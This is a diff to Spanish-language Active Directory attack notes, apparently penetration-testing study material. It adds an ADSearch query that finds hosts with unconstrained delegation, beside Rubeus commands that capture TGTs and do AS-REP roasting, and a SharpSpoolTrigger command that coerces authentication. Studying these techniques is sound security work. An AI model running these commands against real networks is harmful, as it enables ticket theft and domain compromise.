@@ -320,11 +320,15 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:
 ```
 ## Unconstrained Delegation
 
+Ver los equipos vulnerables a unconstrained delegation
+```
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
+```
 Ponerse escucha para recibir un TGT
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
 ```
-Forzar la autenticacion de un equipo a nosotros
+Forzar la autenticacion de un equipo a nosotros (desde otro equipo)
 ```
 execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe TARGET LISTENER
 ```
